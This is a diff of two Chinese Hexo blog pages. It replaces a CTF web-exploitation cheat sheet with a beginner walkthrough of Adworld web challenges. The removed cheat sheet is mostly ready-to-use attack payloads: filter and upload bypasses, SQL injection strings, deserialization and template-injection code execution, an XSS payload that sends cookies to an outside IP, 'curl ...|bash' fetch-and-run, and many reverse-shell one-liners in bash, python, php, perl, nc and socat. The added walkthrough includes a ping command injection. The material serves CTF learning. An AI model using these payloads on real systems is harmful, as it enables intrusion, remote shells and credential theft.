@@ -19,7 +19,7 @@
 
   <!-- 页面元数据 -->
   
-  <title>ctfweb - Hexo</title>
+  <title>攻防世界新手区题解 - Hexo</title>
   
 
   
@@ -305,7 +305,7 @@
     <div id="l_cover">
   
     
-        <div id="full" class='cover-wrapper post dock' style="display: none;">
+        <div id="full" class='cover-wrapper web dock' style="display: none;">
           
             <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg"></div>
           
@@ -381,7 +381,7 @@
         
 
 <div class='l_main'>
-  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
+  <article class="article post white-box reveal md shadow article-type-web" id="web" itemscope itemprop="blogPost">
   
 
 
@@ -391,7 +391,7 @@
     
     
       <h1 class="title">
-        ctfweb
+        攻防世界新手区题解
       </h1>
       <div class='new-meta-box'>
         
@@ -415,7 +415,7 @@
             <div class="new-meta-item date">
   <a class='notlink'>
     <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：Mar 8, 2021</p>
+    <p>发布于：Mar 4, 2021</p>
   </a>
 </div>
 
@@ -426,7 +426,7 @@
   <div class="new-meta-item browse leancloud">
     <a class='notlink'>
       
-      <div id="lc-pv" data-title="ctfweb" data-path="/2021/03/08/ctfweb/">
+      <div id="lc-pv" data-title="攻防世界新手区题解" data-path="/2021/03/04/Web%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E5%8C%BA%E9%A2%98%E8%A7%A3/">
         <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
         <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
         次浏览
@@ -443,503 +443,29 @@
 
 
   
-  CTF web小总结
-一些小技巧吧，记录一下，会继续补充
-PHP绕过技巧
-preg_replace
-绕过preg_replace('/('.$re.')/ei','strtolower("\\1")',$str);
-执行phpinfo的payload：\S*=${phpinfo()}
-参考： 深入研究preg_replace与代码执行
-PHP伪随机数
-mt_srand(seed)
-mt_rand()
-只要种子一样，那么生成的随机数是不会变的，所以我们可以利用php_mt_rand4.0进行爆破种子
-比如：
-mt_srand(12345)
-mt_rand()
-第一个肯定是1996335345
-
-HTTP头相关绕过
-伪造IP：
-一般我们都知道可以用XXF伪造IP：X-Forwarded-For:127.0.0.1
-当XXF被过滤的时候我们可以利用Client-IP: 127.0.0.1和X-Real-IP: 127.0.0.1进行绕过
-绕过is_numeric
-代码如下：
-if (is_numeric($password)) {
-	echo "password can't be number</br>";
-}elseif ($password == 404) {
-	echo "Password Right!</br>";
-}
-传入password=404%0a即可绕过7
-数字长度绕过
-采用科学计数法， 100000000 可以表示成10e8
-绕过 (file_get_contents($text,‘r’)===“xxxx”)
-利用php://input协议进行绕过
-POST /?text=php://input
-
-xxxx
-
-data://text/plain协议也可以绕过
-?text=data://text/plain;base64,xxxx的base64加密
-JWT
-在线解密：https://jwt.io/
-爆破工具以及安装方法：
-git clone "https://github.com/brendan-rius/c-jwt-cracker"
-apt-get install libssl-dev
-make
-MD5 hash长度扩展攻击
-原理：Hash Length Extension Attack
-工具安装：
-git clone https://github.com/bwall/HashPump
-apt-get install g++ libssl-dev
-cd HashPump
-make
-make install
-
-使用方法：
-比如：md5(secert_key+scan)
-secert_key为16位、需要把read拓展进去，也就是变成md5(secert_key+scan+read)
-
-hashdump
-input Signature: md5(secert_key+scan)值
-input Date:	scan
-input Key Length: 16
-Input Data to add: read	———— 输入完毕Enter即可
-
-绕过intval($num)==$num && 回文
-?num=1000000000000000.00000000000000010
-
-绕过 $md5==md5(md5($md5))
-$md5=0e1138100474 
-
-绕过$md5==md5($md5)
-$md5=0e215962016
-
-PHP反序列化
-反序列化逃逸
-第一种关键词过滤，变少的
-就是由于关键词过滤，导致字符变少的，比如说php置换为空，flag置换为空，这种都有可能导致字符逃逸
-代表题目[安洵杯 2019]easy_serialize_php
-第二种关键词过滤，变多的
-比如说0ctf中的piapiapia，由于where–>hacker导致字符数增加，根据反序列化的特性：反序列化中值的字符读取多少其实是由表示长度的数字控制的 ，;}之后的不会起作用。
-代表题目0CTF piapiapia、i春秋2020新春公益赛 babyphp
-session反序列化
-主要就是由于session处理器不同所导致的问题，比如说系统默认为 php_serialize，而页面中却设置为php，那么就极有可能导致安全问题。具体原理参考文章：PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患
-代表题目：Jarvis OJ WEB PHPINFO
-python反序列化
-import pickle
-import urllib
-
-class test(object):
-    def __reduce__(self):
-       return (eval, ("open('/flag.txt','r').read()",))
-
-payload=pickle.dumps(test())
-payload=urllib.quote(payload)
-
-print payload
-
-Phar反序列化
-要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件
-<?php
-	class User{
-		pop链
-	}
-
-	$a = new User();
-	$a->db = new FileList();
-
-	$phar = new Phar("1.phar");
-	$phar->startBuffering();
-	$phar->setStub("<?php __HALT_COMPILER(); ?>");
-	$phar->setMetadata($a);
-	$phar->addFromString("test.txt","test");
-	$phar->stopBuffering();
-
-将phar上传，通过phar://伪协议解析phar文件时，会将meta-data进行反序列化
-注：只有以下函数通过phar://伪协议解析phar文件才会将meta-data进行反序列化
-fileatime、filectime、file_exists、file_get_contents、file_put_contents、file、filegroup、fopen、fileinode、filemtime、fileowner、fileperms、is_dir、is_executable、is_file、is_link、is_ readable、is_writable、is_writeable、parse_ini_file、copy、unlink、stat、readfile
-PHP上传绕过
-短标签
-有时在上传的过程中会出现php关键词过滤，这时候可以尝试一下短标签<?=?> <??>
-需要short_open_tag = On
-如果asp_tags=On那么还支持<%%>的写法
-绕过对<?的检测
-1、<script language="php"></script>
-2、对内容进行base64编码，解析时再解码
-文件头检测绕过
-一般使用GIF89a进行绕过，不过不适用于.htaccess文件上传，如果这样上传会导致.htaccess无法生效
-.htaccess中绕过文件头检测:
-1、在.htaccess前添加
-#define width 1337
-#define height 1337
-#在.htaccess是注释符，所以.htaccess文件可以生效
-
-2、在.htaccess前添加x00x00x8ax39x8ax39(要在十六进制编辑器中添加，或者使用python的bytes类型)
-x00x00x8ax39x8ax39是wbmp文件的文件头
-.htaccess中以0x00开头的同样也是注释符，所以不会影响.htaccess
-后缀名绕过
-phtml、php5、php7等
-.user.ini
-nginx的服务器，而且上传目录下有一个php文件，故可以上传.user.ini
-GIF89a
-auto_prepend_file=1.gif #php页面自动包含文件
-.htaccess
-apache的服务器，可以上传.htaccess
-同时绕过对<?的检测
-AddType application/x-httpd-php .abc
-php_value auto_append_file "php://filter/convert.base64-decode/resource=./文件名"
-第二种：
-类似于把文件名后缀1解析成php
-<FilesMatch "1">
-SetHandler application/x-httpd-php
-</FilesMatch>
-shtml文件的SSI注入
-如果支持shtml，那么可以上传一个shtml文件，里面进行ssi注入：
-将文本内容直接插入到文档中<#include>
-<! #include file="文件名称"–>
-<!--#include virtual="index.html" -->
-直接执行服务器上的各种程序<#exec>(如CGI或其他可执行程序)
-<!--#exec cmd="cat /etc/passwd"-->
-php文件包含
-文件包含
-php://filter/read=convert.base64-encode/resource=文件
-NGINX日志路径包含
-file=../../../../../var/log/nginx/access.log
-SQL注入
-过滤绕过
-单引号被过滤：
-并不一定就能够防止sql注入
-当sql语句为：select * from users where username='xxxx' and password='xxxx'时
-我们可以使用\进行绕过，构造username=admin\,password=or 1=1#
-这是sql语句就会变成：
-select * from users where username='admin\' and password='or 1=1#'成功绕过
-select被过滤：
-这个时候可以盲猜表名进行盲注
-如果时堆叠注入可以使用handler代替select查询：
-1'; handler FlagHere open as hack; handler hack read first; handler hack close;
-=被过滤：
-可以用like进行绕过
-and被过滤：
-可以使用&&绕过
-or被过滤：
-可以使用||绕过
-or被过滤意味着information不能使用，不过可以用mysql.innodb_table_stats和sys.schema_auto_increment_columns
-in被过滤：
-同样意味着information不能使用，不过可以使用sys.schema_table_statistics_with_buffer代替
-空格绕过：
-/**/
-updatexml报错注入
-如果过长无法显示可以使用substr、mid剪切，或者使用left、right
-基于regexp的时间盲注
-select * from flllllllag where id=1 and if((substr((flag),1,1) regexp "^f"), sleep(5),1)
-无union select和字段名注数据
-常用的无字段名注入都依赖于union select，如果不允许union和select同时出现，那可以使用如下方法
-如果表中只有一列可以 SUBSTR((SELECT * FROM table),1,1)='x'
-如果由两列： 需要将查询语句与相同数量的列进行比较，再配合 <= 进行盲注
-如果说数据库中的table2中有两列，一个id，一个flag，这可以采用如下方法进行盲注
-执行select (select '1','e~')>(select * from table2 limit 1)显示0
-执行select (select '1','f~')>(select * from table2 limit 1)显示1
-执行select (select '1','fl~')>(select * from table2 limit 1)显示1
-不过注意一点mysql默认是不区分大小写的，所以我们可以转化成16进制再执行
-PDO宽字节注入
-check过滤了：
-'/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\^|&|database/i'
-
-if(check($id)){
-    $query = "select balabala from table1 where 1=?";
-    $db->query("set names gbk");
-    $row = $db->prepare($query);
-    $row->bindParam(1,$id);
-    $row->execute();
-}
-如果没有过滤那么可以使用宽字节进行注入
-但是这里过滤了很多的东西，基本都过滤了，但是我们可以利用
-SET @x=执行SQL语句的16进制;PREPARE a FROM @x;EXECUTE a;进行注入
-load_file
-有时候权限可以使用该函数时，可以直接读取文件：load_file(’/var/www/html/xxx.php’)
-EXIF注入
-奇葩注入，上传图片，然后在EXIF的comment中写入注入语句即可
-CTFshow中的题目，利用工具：exiftools，payload：
-exiftool -overwrite_original -comment="A_dmin\"');select 0x3C3F3D60245F504F53545B305D603B into outfile '/var/www/html/1.php';--+"
-SQLite注入
-sqlite_master是sqlite数据库中的一个隐藏表，，，，有如下字段：type/name/tbl_name/rootpage/sql
-usr=' union select name,sql from sqlite_master--+&pw=admin
-查询语句：
-usr=' union select id,id from Users--+&pw=admin
-usr=' union select id,name from Users--+&pw=admin
-usr=' union select id,password from Users--+&pw=admin
-usr=' union select id,hint from Users--+&pw=admin
-对应结果：
-name=+1;
-name=+admin;
-name=+3fab54a50e770d830c0416df817567662a9dc85c;
-name=+my fav word in my fav paper?!;
-文件名注入
-数据库语句可能为：
-INSERT INTO `xxx`(`id`, `name`) VALUES ('id号','图片名') 
-注入方法：
-conv函数将16进制转化为10进制进行输出
-'+(conv(substr(hex(database()),1,12),16,10))+'.jpg
-SSRF
-格式化字符串
-出现如下代码时，并且对参数没有过滤时：
-print(sprintf("$url method&content_size:$method%d", $detect));
-可以传递$method=GET%s%，在ssrf题目中可以读取内网的文件
-XSS
-原生类XSS
-代码如下：
-$a = $_GET['yds_is_so_beautiful']; 
-echo unserialize($a); 
-这里有个echo，应该是包含__toString的，那我们可以使用Error和Exception类，直接用Exception，因为Error只适用于php7
-<?php
-$a = serialize(new Exception("<script>window.location.href='IP'+document.cookie</script>"));
-echo urlencode($a);
-?>
-将结果传递就行
-命令执行
-各种绕过
-空格绕过
-$IFS、$IFS$9g、 ${IFS} 
-关键词绕过，使用变量拼接，如flag被过滤：
-a=g;cat fla$a.php 
-cat被过滤可以使用cut，more，tail，head等命令
-奇淫技巧
-cat `ls` 会查看ls出来的文件
-无参RCE
-即只能通过无参函数来进行命令执行
-查看当前目录：var_dump(scandir(current(localeconv())));
-读取倒数第二个文件：readfile(next(array_reverse(scandir(current(localeconv())))));、
-readfile(next(array_reverse(scandir(getcwd()))));
-还有session_id(session_start())也能够利用
-还有getallheaders：
-请求头最后添加：
-hacker: system('cat flag.php');
-
-payload=eval(end(getallheaders()));
-Curl命令反弹shell
-接收端创建文件shell.txt写入bash -i >& /dev/tcp/[ip]/[port] 0>&1
-在命令执行处执行curl http://接收端IP/shell.txt|bash
-无数字无字母RCE
-一般采用异或、自增、取反进行绕过
-异或脚本：
-<?php
-function finds($string){
-	$index = 0;
-	$a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255];
-	for($i=27;$i<count($a);$i++){
-		for($j=27;$j<count($a);$j++){
-			$x = $a[$i] ^ $a[$j];
-			for($k = 0;$k<strlen($string);$k++){
-				if(ord($string[$k]) == $x){
-					echo $string[$k]."\n";
-					echo '%' . dechex($a[$i]) . '^%' . dechex($a[$j])."\n";
-					$index++;
-					if($index == strlen($string)){
-						return 0;
-					}
-				}
-			}
-		}
-	}
-}
-finds("_GET");
-?>
-自增：
-$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);//assert($_POST[_]);
-绕过open_basedir
-payload:
-chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('/THis_Is_tHe_F14g'));
-php数学函数getshell
-?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs});&pi=system()&abs=ls /
-一句话反弹shell
-本机监听：
-nc -lvvp 8080
-python：
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("174.1.175.38",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.37.131",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-
-python一句话获取标准shell：
-python -c "import pty;pty.spawn('/bin/bash')"
-php：
-php -r '$sock=fsockopen("192.168.37.131",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
-bash直接反弹：
-bash -i >& /dev/tcp/192.168.37.131/8080 0>&1
-nc反弹：
-nc 192.168.31.174 8080 -t -e /bin/bash
-perl脚本反弹：
-perl -e 'use Socket;$i="192.168.31.41";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-java脚本反弹：
-r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.31.41/8080;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
-p.waitFor()
-msfvenom 获取反弹一句话
-msfvenom -p cmd/unix/reverse_xxxx lhost=1.1.1.1 lport=12345 R
-socat 反弹一句话
-# 第一步：下载socat到/tmp目录下
-wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat
-# 第二步：给socaat授予可以执行权限
-chmod 755 /tmp/socat
-#第三步：反弹shell到目标主机的12345端口
-/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.31.41：12345
-Linux知识点
-在 linux 系统中如果一个程序打开了一个文件没有关闭，即便从外部（上文是利用 rm -f flag.txt）删除之后，在 /proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的 fd，通过这个我们即可得到被删除文件的内容。
-cat /proc/*/fd/*
-查找报告xxx内容的文件内容
-find /etc -name "*" | xargs grep "flag{"
-模板注入
-smarty php模板注入
-比如说有个回显IP的： X-Forwarded-For:{{system("cat /flag")}}
-Twig PHP模板注入
-提交 {{7*‘7’}} 得到49
-payload：
-{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
-jinja2 Python模板注入
-提交 {{7*‘7’}} 得到7777777
-payload：
-{% for c in [].__class__.__base__.__subclasses__() %}
-{% if c.__name__=='_IterationGuard' %}
-{{ c.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()") }}
-{% endif %}
-{% endfor %}
-Tornado模板中的 handler.settings
-获取handler.settings环境变量 {{handler.settings}}
-信息泄露
-PHPINFO
-目录遍历
-git泄露
-.DS_Store
-robots.txt泄露
-备份文件泄露
-.bak、.swp、.php~
-.swp文件恢复使用命令：vim -r .index.php.swp恢复
-源码泄露
-常见的网站源码备份文件后缀
-tar、tar.gz、zip、rar
-常见的网站源码备份文件名
-web、website、backup、back、www、wwwroot、temp
-用户历史文件
-/home/www/.bash_history
-JAVAweb应用目录
-/WEB-INF/web.xml：				Web应用程序的配置文件
-/WEB-INF/classes/：				包含站点所有的class文件
-/WEB-INF/lib/：					存放需要的jar文件
-/WEB-INF/src/：					源码目录
-/WEB-INF/database.properties：	数据库配置文件
+  <p>1.view_source：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。<br> 本题打开网页查看源代码即得到flag<br> 2.robots：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。<br> 本题看提示robots协议，就在地址栏后面跟上robots.txt，<img src="https://img-blog.csdnimg.cn/2020121520061913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/2020121520061913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,666" alt="在这里插入图片描述"><br> 可以看到第三行，即地址栏修改为f1ag_1s_h3re.php，<img src="https://img-blog.csdnimg.cn/20201215200757492.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20201215200757492.png" srcset="data:image/png;base64,666" alt="在这里插入图片描述"><br>3.backup:X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！<br>本题需要知道备份文件的后缀名，常见的备份文件后缀名有: .git .svn .swp .svn .~ .bak .bash_history，尝试后发现为bak，故地址栏修改为index.php.bak<img src="https://img-blog.csdnimg.cn/20201215201219732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20201215201219732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,666" alt="在这里插入图片描述"><br>4.cookie:X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’<br>本题需要查看cookie，F12查看源代码，选择cookie栏<img src="https://img-blog.csdnimg.cn/20201215201950773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20201215201950773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,666" alt="在这里插入图片描述"><br>5.disabled_button：X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？<br>本题只要想办法让按钮可以按即可，查看源代码发现这一条，将其删除，按钮可以按下<br><img src="https://img-blog.csdnimg.cn/20201215202420114.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20201215202420114.png" srcset="data:image/png;base64,666" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201215202546626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20201215202546626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,666" alt="在这里插入图片描述"><br>6.weak_auth：小宁写了一个登陆验证页面，随手就设了一个密码。<br><img src="https://img-blog.csdnimg.cn/2020121520265144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/2020121520265144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,666" alt="在这里插入图片描述"><br>随便输入登录提示使用admin用户名，然后网页地址到了check.php<br><img src="https://img-blog.csdnimg.cn/20201215202759581.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20201215202759581.png" srcset="data:image/png;base64,666" alt="在这里插入图片描述"><br>用burp抓包，send to Intruder，在Positions中先clear§，再在password的值左右Add§<br><img src="https://img-blog.csdnimg.cn/20201215205159138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20201215205159138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,666" alt="在这里插入图片描述"></p>
+<p>选择payloads选项，载入字典进行爆破，查看返回结果可知密码<br>7.simple_php：小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。<br><img src="https://img-blog.csdnimg.cn/20201215205613779.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20201215205613779.png" srcset="data:image/png;base64,666" alt="在这里插入图片描述"><br>进行php代码审计，php中有两种比较符号，=== 会同时比较字符串的值和类型，== 会先将字符串换成相同类型，再作比较，属于弱类型比较<br>当同时满足a==0和a时输出flag1<img src="https://img-blog.csdnimg.cn/20201215210046824.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20201215210046824.png" srcset="data:image/png;base64,666" alt="在这里插入图片描述"><br>== 是不严格的比较,会先进行类型转换再比较 ,查看php类型比较表<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/types.comparisons.php">https://www.php.net/manual/zh/types.comparisons.php</a><br>发现“0”为 true，所以可以把参数 a 构造为’0’或者‘alph’这种转换后为 0 但本身不为 False 的形式<br>ps：数字和字符混合的字符串转换为整数后只保留数字！<br>is_numeric() 函数用于检测类型是否为数字或数字字符串<img src="https://img-blog.csdnimg.cn/20201215210538673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20201215210538673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,666" alt="在这里插入图片描述"><br>8.get_post：X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？<br>GET - 从指定的资源请求数据<br>POST - 向指定的资源提交要被处理的数据<br>在地址后加？分隔，a=1；用hackbar插件post data传b=2<img src="https://img-blog.csdnimg.cn/20201215211106145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20201215211106145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,666" alt="在这里插入图片描述"><br>9.xff_referer：X老师告诉小宁其实xff和referer是可以伪造的。<br>X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项<br>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的<br>用burp抓包，先xff，后发现需要referer<br>10.webshell：小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。<br>一句话木马，通过蚁剑连接，发现一个flag.txt文件<img src="https://img-blog.csdnimg.cn/20201215215207985.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20201215215207985.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,666" alt="在这里插入图片描述"><br>11.command_execution:小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。<br>在文本框中写127.0.0.1 | find / -name “flag.txt” <img src="https://img-blog.csdnimg.cn/2020121521560195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/2020121521560195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,666" alt="在这里插入图片描述"><br>看到目录下的flag文件，打开<br><img src="https://img-blog.csdnimg.cn/20201215215709330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20201215215709330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,666" alt="在这里插入图片描述"><br>12.simple_js：小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} )<br>输入任何密码都错误，源代码中<img src="https://img-blog.csdnimg.cn/20201215220114458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20201215220114458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,666" alt="在这里插入图片描述"><br>应该是base16，写脚本<br><img src="https://img-blog.csdnimg.cn/20201215220342689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" class="lazyload" 